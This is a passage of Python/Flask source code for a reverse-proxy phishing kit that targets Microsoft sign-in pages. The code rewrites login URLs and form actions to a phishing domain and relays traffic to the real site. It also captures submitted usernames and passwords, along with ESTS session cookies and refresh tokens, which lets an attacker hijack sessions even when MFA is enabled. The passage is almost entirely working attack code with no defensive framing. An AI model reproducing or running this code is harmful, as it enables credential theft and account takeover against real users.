session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
})

captured = {"credentials": [], "tokens": []}


def rewrite_url(url):
    if not url:
        return url
    parsed = urlparse(url)
    if parsed.netloc.lower() in (TARGET_HOST, "www." + TARGET_HOST, "login.live.com"):
        return f"https://{PHISH_DOMAIN}{parsed.path}" + (f"?{parsed.query}" if parsed.query else "")
    return url


def rewrite_body(body, content_type):
    if not body:
        return body
    text = body.decode("utf-8", errors="ignore")
    text = re.sub(
        r'(https?://)(login\.microsoftonline\.com|login\.live\.com)([^"\'\\s<>]*)',
        lambda m: f"https://{PHISH_DOMAIN}{m.group(3)}",
        text,
    )
    text = re.sub(
        r'//(login\.microsoftonline\.com|login\.live\.com)([^"\'\\s<>]*)',
        lambda m: f"//{PHISH_DOMAIN}{m.group(2)}",
        text,
    )
    text = re.sub(
        r'action=["\'](https?://[^"\']+)["\']',
        lambda m: f'action="{rewrite_url(m.group(1))}"',
        text,
    )
    return text.encode("utf-8")


def build_target_url(path):
    return f"{TARGET_BASE}{path}" + (f"?{request.query_string.decode()}" if request.query_string else "")


def proxy_request(method, target_url):
    headers = {k: v for k, v in request.headers.items() if k.lower() not in ("host", "content-length", "cookie", "connection")}
    headers["Host"] = TARGET_HOST
    cookies = {c.name: c.value for c in request.cookies.values()}
    data = request.get_data() if method in ("POST", "PUT", "PATCH") else None
    resp = session.request(method, target_url, headers=headers, cookies=cookies, data=data, allow_redirects=False, stream=True)
    return resp


def capture_creds(data):
    params = parse_qs(data.decode("utf-8", errors="ignore"))
    username = params.get("login", params.get("loginfmt", [None]))[0]
    password = params.get("passwd", [None])[0]
    if username and password:
        captured["credentials"].append({"username": username, "password": password})


def capture_tokens(cookies, body=None):
    for name, value in cookies.items():
        if name.lower() in ("estshauth", "estsauthpersistent", "estssession", "x-ms-estealth-relay", "srfp"):
            captured["tokens"].append({"name": name, "value": value})
    if body:
        for token in re.findall(r'"refresh_token":"([^"]+)"', body.decode("utf-8", errors="ignore")):
            captured["tokens"].append({"name": "refresh_token", "value": token})


@app.route("/", defaults={"path": ""}, methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
def handler(path):
    target_url = build_target_url("/" + path)
    method = request.method
    if method == "POST" and request.content_type and "application/x-www-form-urlencoded" in request.content_type:
        capture_creds(request.get_data())
    resp = proxy_request(method, target_url)
    content = resp.content
    content_type = resp.headers.get("Content-Type", "")
    if "text/html" in content_type or "application/javascript" in content_type or "text/css" in content_type:
        content = rewrite_body(content, content_type)
    capture_tokens(resp.cookies, content)
    response = make_response(content, resp.status_code)
    for k, v in resp.headers.items():
        if k.lower() not in ("content-length", "transfer-encoding", "content-encoding", "connection"):
